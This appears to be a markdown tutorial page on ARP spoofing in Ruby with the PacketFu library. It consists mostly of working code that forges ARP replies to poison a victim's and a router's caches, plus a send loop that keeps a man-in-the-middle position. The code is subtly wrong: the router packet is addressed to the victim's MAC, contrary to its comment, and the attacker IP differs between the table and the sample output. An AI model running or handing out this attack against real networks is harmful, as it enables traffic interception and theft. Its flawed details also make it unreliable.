# ARP Spoofing
As you know, ARP Spoofing attack in the core of MiTM attack.


**Scenario**

| Host/Info |   IP Address  |    MAC Address    |
|-----------|:-------------:|:-----------------:|
| Attacker  | 192.168.0.100 | 3C:77:E6:68:66:E9 |
| Victim    | 192.168.0.19  | 00:50:7F:E6:96:21 |
| Router    | 192.168.0.1   | 00:50:7F:E6:96:20 |

To know our/attacker's interface information

```ruby
info = PacketFu::Utils.whoami?(:iface => "wlan0")
```
returns a hash
```
{:iface=>"wlan0",
 :pcapfile=>"/tmp/out.pcap",
 :eth_saddr=>"3c:77:e6:68:66:e9",
 :eth_src=>"<w\xE6hf\xE9",
 :ip_saddr=>"192.168.0.13",
 :ip_src=>3232235533,
 :ip_src_bin=>"\xC0\xA8\x00\r",
 :eth_dst=>"\x00P\x7F\xE6\x96 ",
 :eth_daddr=>"00:50:7f:e6:96:20"}
```
So you can extract these information like any hash `info[:iface]`, `info[:ip_saddr]`, `info[:eth_saddr]`, etc..


**Building victim's ARP packet**
```ruby
# Build Ethernet header
arp_packet_victim = PacketFu::ARPPacket.new
arp_packet_victim.eth_saddr = "3C:77:E6:68:66:E9"       # our MAC address
arp_packet_victim.eth_daddr = "00:50:7F:E6:96:21"       # the victim's MAC address
# Build ARP Packet
arp_packet_victim.arp_saddr_mac = "3C:77:E6:68:66:E9"   # our MAC address
arp_packet_victim.arp_daddr_mac = "00:50:7F:E6:96:21"   # the victim's MAC address
arp_packet_victim.arp_saddr_ip = "192.168.0.1"          # the router's IP
arp_packet_victim.arp_daddr_ip = "192.168.0.19"         # the victim's IP
arp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP reply
````
**Building router packet**
```ruby
# Build Ethernet header
arp_packet_router = PacketFu::ARPPacket.new
arp_packet_router.eth_saddr = "3C:77:E6:68:66:E9"       # our MAC address
arp_packet_router.eth_daddr = "00:50:7F:E6:96:21"       # the router's MAC address
# Build ARP Packet
arp_packet_router.arp_saddr_mac = "3C:77:E6:68:66:E9"   # our MAC address
arp_packet_router.arp_daddr_mac = "00:50:7F:E6:96:20"   # the router's MAC address
arp_packet_router.arp_saddr_ip = "192.168.0.19"         # the victim's IP
arp_packet_router.arp_daddr_ip = "192.168.0.1"          # the router's IP
arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

```
Run ARP Spoofing attack

```ruby
# Run until we get killed by the parent, sending out packets
while true
    sleep 1
    arp_packet_victim.to_w(info[:iface])
    arp_packet_router.to_w(info[:iface])
end
```
Source[^*]


<br><br>
---
[^*] Source: [DNS Spoofing Using PacketFu](http://crushbeercrushcode.org/2012/10/ruby-dns-spoofing-using-packetfu/)
